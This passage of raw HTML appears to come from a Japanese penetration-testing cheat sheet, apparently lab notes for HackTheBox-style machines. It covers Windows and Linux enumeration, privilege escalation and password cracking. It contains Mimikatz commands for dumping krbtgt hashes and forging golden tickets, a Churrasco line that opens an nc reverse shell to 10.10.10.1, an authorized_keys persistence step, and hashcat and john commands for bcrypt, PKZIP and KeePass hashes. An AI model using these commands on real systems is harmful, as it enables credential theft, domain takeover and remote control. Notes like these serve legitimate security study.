class=\"token function\">dir</span> <span class=\"token string\">\"C:\\Users\"</span></code></pre></div>\n<h3 id=\"windowsエクスプロイトの特定\" style=\"position:relative;\"><a href=\"#windows%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%AE%E7%89%B9%E5%AE%9A\" aria-label=\"windowsエクスプロイトの特定 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windowsエクスプロイトの特定</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># windows-exploit-suggesterにsysteminfoを与えて探索(Python2/xlrd==1.1.0が必要)</span>\npip <span class=\"token function\">install</span> <span class=\"token assign-left variable\">xlrd</span><span class=\"token operator\">==</span><span class=\"token number\">1.1</span>.0\n<span class=\"token function\">rm</span> ./*.xls\npython windows-exploit-suggester.py --update\n<span class=\"token function\">ls</span> ./*.xls <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>read d<span class=\"token punctuation\">;</span> python windows-exploit-suggester.py --systeminfo systeminfo.txt --database <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Serchsploit</span>\nsearchsploit <span class=\"token operator\">&lt;</span>Keyword<span class=\"token operator\">></span></code></pre></div>\n<h3 id=\"windowsユーザ情報セキュリティ特権の探索\" style=\"position:relative;\"><a href=\"#windows%E3%83%A6%E3%83%BC%E3%82%B6%E6%83%85%E5%A0%B1%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%89%B9%E6%A8%A9%E3%81%AE%E6%8E%A2%E7%B4%A2\" aria-label=\"windowsユーザ情報セキュリティ特権の探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windowsユーザ情報、セキュリティ特権の探索</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># ユーザ情報</span>\nnet user\nnet user Administrator\n\n<span class=\"token comment\"># プロセスのトークンのユーザが保有するセキュリティ特権の一覧</span>\n<span class=\"token function\">whoami</span> /priv\n\n<span class=\"token comment\"># ユーザとドメインの確認</span>\nlusrmgr.msc</code></pre></div>\n<p>参考：[Poc’ing Beyond Domain Admin - Part 1 - \\cube0x0](<a href=\"https://cube0x0.github.io/Pocing-Beyond-DA/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://cube0x0.github.io/Pocing-Beyond-DA/</a>)</p>\n<h3 id=\"uacの変更\" style=\"position:relative;\"><a href=\"#uac%E3%81%AE%E5%A4%89%E6%9B%B4\" aria-label=\"uacの変更 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UACの変更</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">UserAccountControlSettings.exe</code></pre></div>\n<h3 id=\"フォルダ共有フォルダの権限の探索\" style=\"position:relative;\"><a href=\"#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E5%85%B1%E6%9C%89%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%81%AE%E6%A8%A9%E9%99%90%E3%81%AE%E6%8E%A2%E7%B4%A2\" aria-label=\"フォルダ共有フォルダの権限の探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>フォルダ、共有フォルダの権限の探索</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">icacls でアクセス許可を確認\n\n<span class=\"token comment\">#I-親コンテナから継承された権限</span>\n<span class=\"token comment\">#F-フルアクセス（フルコントロール）</span>\n<span class=\"token comment\">#M-権利/アクセスを変更する</span>\n<span class=\"token comment\">#OI-オブジェクト継承</span>\n<span class=\"token comment\">#IO-継承のみ</span>\n<span class=\"token comment\">#CI-コンテナ継承</span>\n<span class=\"token comment\">#RX-読み取りと実行</span>\n<span class=\"token comment\">#AD-データを追加します（サブディレクトリを追加します）</span>\n<span class=\"token comment\">#WD-データの書き込みとファイルの追可</span></code></pre></div>\n<h3 id=\"環境変数の確認\" style=\"position:relative;\"><a href=\"#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%AE%E7%A2%BA%E8%AA%8D\" aria-label=\"環境変数の確認 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>環境変数の確認</h3>\n<h2 id=\"特権取得windows\" style=\"position:relative;\"><a href=\"#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97windows\" aria-label=\"特権取得windows permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>特権取得(Windows)</h2>\n<h3 id=\"mimikatzでkerberos環境を攻撃する\" style=\"position:relative;\"><a href=\"#mimikatz%E3%81%A7kerberos%E7%92%B0%E5%A2%83%E3%82%92%E6%94%BB%E6%92%83%E3%81%99%E3%82%8B\" aria-label=\"mimikatzでkerberos環境を攻撃する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>mimikatzでKerberos環境を攻撃する</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># mimikatz.exe</span>\n<span class=\"token comment\"># .kirbiチケットのエクスポート</span>\nsekurlsa::tickets /export\n<span class=\"token comment\"># チケットの偽装</span>\nkerberos::ptt <span class=\"token operator\">&lt;</span>ticket<span class=\"token operator\">></span>\n\n<span class=\"token comment\"># ========================================================</span>\n<span class=\"token comment\"># mimikatz.exe</span>\n<span class=\"token comment\"># ゴールデンチケットの作成に必要なハッシュとセキュリティ識別子のダンプ</span>\nlsadump::lsa /inject /name:krbtgt\n\n<span class=\"token comment\"># ゴールデンチケットを作成してシルバーチケットを作成するためのコマンド</span>\n<span class=\"token comment\"># サービスNTLMハッシュをkrbtgtスロットに入れ、サービスアカウントのsidをsidに入れ、idを1103に変更する</span>\nKerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:\n\n<span class=\"token comment\"># mimikatzで指定されたチケットを使用して新しい昇格されたコマンドプロンプトを起動</span>\nmisc::cmd</code></pre></div>\n<ul>\n<li>マシンのLSASSメモリからTGTをダンプすることにより、チケットを取得し、偽装することができる。</li>\n<li>ドメインのSQLサーバーにアクセスしたいが、現在侵害されているユーザーはそのサーバーにアクセスできないとき、そのサービスをkerberoastingすることで、足がかりを得るためのアクセス可能なサービスアカウントを見つけることができる。次に、サービスハッシュをダンプし、TGTになりすまして、KDCからSQLサービスのサービスチケットを要求し、ドメインのSQLにアクセスできるようにする。</li>\n</ul>\n<h3 id=\"ローカル特権昇格ツール\" style=\"position:relative;\"><a href=\"#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E7%89%B9%E6%A8%A9%E6%98%87%E6%A0%BC%E3%83%84%E3%83%BC%E3%83%AB\" aria-label=\"ローカル特権昇格ツール permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ローカル特権昇格ツール</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># ユーザーがSeImpersonateまたはSeAssignPrimaryToken特権を持っている場合、COMサーバを悪用して特権を取得できる場合がある</span>\n\n\n<span class=\"token comment\"># Victimが古い場合はChurrascoを使う</span>\nchurrasco.exe -d <span class=\"token string\">\"C:\\wmpub<span class=\"token entity\" title=\"\\n\">\\n</span>c.exe -e cmd.exe 10.10.10.1 9999\"</span></code></pre></div>\n<p>参考：<a href=\"https://github.com/ohpe/juicy-potato\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GitHub - ohpe/juicy-potato</a></p>\n<p>参考：<a href=\"https://github.com/Re4son/Churrasco\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GitHub - Re4son/Churrasco: Changes for Visual Studio 2013</a></p>\n<p>参考：<a href=\"https://note.com/lacnote/n/nef29b7c6a94f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">getsystemの中身</a></p>\n<h2 id=\"内部探索linux\" style=\"position:relative;\"><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2linux\" aria-label=\"内部探索linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>内部探索(Linux)</h2>\n<ul>\n<li>rootとuserのcrontabを確認する</li>\n<li><code class=\"language-text\">sudo -l</code>の出力を確認する</li>\n<li>\n<p>認証情報の探索</p>\n<ul>\n<li>設定情報が記載されたconfigファイル</li>\n<li>認証情報が格納されたデータベースのダンプ</li>\n<li>認証情報が平文で書き込まれているアクセスログ</li>\n<li>過去の認証情報が記録されたバックアップファイルやシャドウコピー</li>\n</ul>\n</li>\n<li>\n<p>マウントされたフラッシュディスクのデータをサルベージする</p>\n<ul>\n<li><a href=\"https://kashiwaba-yuki.com/hackthebox-linux-mirai\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">USB メモリからのデータのサルベージ</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"便利コマンド\" style=\"position:relative;\"><a href=\"#%E4%BE%BF%E5%88%A9%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89\" aria-label=\"便利コマンド permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>便利コマンド</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># scp</span>\n<span class=\"token comment\">## upload</span>\n<span class=\"token function\">scp</span> /home/kali/Hacking/Tools/linpeas.sh user@targethost.htb:/home/user\n\n<span class=\"token comment\">## download</span>\n<span class=\"token function\">scp</span> user@targethost.htb:/home/user/user.txt ./\n\n<span class=\"token comment\"># ssh</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"&lt;pub key>\"</span> <span class=\"token operator\">></span> ~/.ssh/authorized_keys\n\n<span class=\"token comment\"># sedによるreplace</span>\n<span class=\"token function\">sed</span> -i <span class=\"token string\">'s/&lt;置き換え元の正規表現>/&lt;置き換え後の文字列>/g'</span> Filename.txt</code></pre></div>\n<h3 id=\"linpeasのtips\" style=\"position:relative;\"><a href=\"#linpeas%E3%81%AEtips\" aria-label=\"linpeasのtips permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>linpeasのTips</h3>\n<ul>\n<li>実行と読み取り</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ./linpeas.sh -a <span class=\"token function\">tee</span> linpeas.txt\n$ <span class=\"token function\">less</span> -r linpeas.txt</code></pre></div>\n<ul>\n<li>良くチェックする項目</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">- Basic information\n  - OSバージョンやUser、Group、Hostname、Writable folder\n\n- System Information\n  - カーネルバージョン、環境変数、Datetime、Systam stat、CPU情報など\n  - <span class=\"token punctuation\">[</span>Executing Linux Exploit Suggester<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>https://github.com/mzet-/linux-exploit-suggester<span class=\"token punctuation\">)</span>の結果\n  - <span class=\"token punctuation\">[</span>Executing Linux Exploit Suggester <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>https://github.com/jondonas/linux-exploit-suggester-2<span class=\"token punctuation\">)</span>の結果\n\n- Processes, Cron, Services, Timers <span class=\"token operator\">&amp;</span> Sockets\n  - 特にroot権限で動いているプロセスやcronを探してみる\n  - Binary processes permissions\n  - Cron <span class=\"token function\">jobs</span>\n  - Services\n\n- Content of /etc/inetd.conf <span class=\"token operator\">&amp;</span> /etc/xinetd.conf\n- Active Ports\n- Users Information\n  - <span class=\"token function\">sudo</span> -l\n  - Superusers\n  - All <span class=\"token function\">users</span> <span class=\"token operator\">&amp;</span> <span class=\"token function\">groups</span>\n  - Login now\n  \n- Software Information \n  - Database\n  - Webサーバ\n  - PHP\n  - SSH\n  - passwdファイル\n\n- Interesting writable files owned by me or writable by everyone <span class=\"token punctuation\">(</span>not <span class=\"token keyword\">in</span> Home<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>max <span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\n- Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders\n- Finding *password* or *credential* files <span class=\"token keyword\">in</span> **</code></pre></div>\n<h3 id=\"端末のディレクトリ探索\" style=\"position:relative;\"><a href=\"#%E7%AB%AF%E6%9C%AB%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%8E%A2%E7%B4%A2\" aria-label=\"端末のディレクトリ探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>端末のディレクトリ探索</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ <span class=\"token function\">ls</span> -la / -R <span class=\"token function\">tee</span> dirlist.txt\n$ <span class=\"token function\">less</span> -r dirlist.txt</code></pre></div>\n<h2 id=\"特権取得linux\" style=\"position:relative;\"><a href=\"#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97linux\" aria-label=\"特権取得linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>特権取得(Linux)</h2>\n<p>(工事中)</p>\n<h2 id=\"パスワードの解読\" style=\"position:relative;\"><a href=\"#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E8%A7%A3%E8%AA%AD\" aria-label=\"パスワードの解読 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>パスワードの解読</h2>\n<h3 id=\"hashcatサンプル\" style=\"position:relative;\"><a href=\"#hashcat%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\" aria-label=\"hashcatサンプル permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Hashcatサンプル</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># 辞書攻撃(bcrypt $2*$, Blowfish (Unix))</span>\nhashcat -a <span class=\"token number\">0</span> -m <span class=\"token number\">3200</span> ./hash.txt /usr/share/wordlists/rockyou.txt\n\n<span class=\"token comment\"># マスクありブルートフォース(PKZIP (Uncompressed))</span>\nhashcat -m <span class=\"token number\">17210</span> -a <span class=\"token number\">3</span> ./hash.txt -1 ?l?u -2 012 -3 0123 -4 0123456789 ?1?1?1?s2021?2?4?3?4?s</code></pre></div>\n<h3 id=\"hashcat-オプションtips\" style=\"position:relative;\"><a href=\"#hashcat-%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3tips\" aria-label=\"hashcat オプションtips permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Hashcat オプションTips</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># Workloadを3か4にする(4はかなり端末リソースを食う)</span>\n-w <span class=\"token number\">3</span>\n\n<span class=\"token comment\"># Attack Mode</span>\n-a \n<span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>\n<span class=\"token number\">0</span> <span class=\"token operator\">|</span> Straight\n<span class=\"token number\">3</span> <span class=\"token operator\">|</span> Brute-force</code></pre></div>\n<h3 id=\"keepass-database\" style=\"position:relative;\"><a href=\"#keepass-database\" aria-label=\"keepass database permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>KeePass database</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ keepass2john MyPasswords.kdbx <span class=\"token operator\">></span> dbhash.txt <span class=\"token comment\"># DBNAME:$keepass$....</span>\n\n<span class=\"token comment\"># keepass2johnでKeyファイルを使用</span>\n$ keepass2john MyPasswords.kdbx <span class=\"token operator\">></span> dbhash.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ls</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> keyfile <span class=\"token operator\">|</span> <span class=\"token keyword\">while</span> <span class=\"token builtin class-name\">read</span> f<span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> keepass2john -k <span class=\"token variable\">$f</span> MyPasswords.kdbx <span class=\"token operator\">>></span> dbhash.txt <span class=\"token punctuation\">;</span> <span class=\"token keyword\">done</span>\n\n$ john dbhash.txt /usr/share/wordlists/rockyou.txt\n$ hashcat -a <span class=\"token number\">0</span> -m <span class=\"token number\">13400</span> -w <span class=\"token number\">4</span> dbhash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>\n<h2 id=\"pwnのtips\" style=\"position:relative;\"><a href=\"#pwn%E3%81%AEtips\" aria-label=\"pwnのtips permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 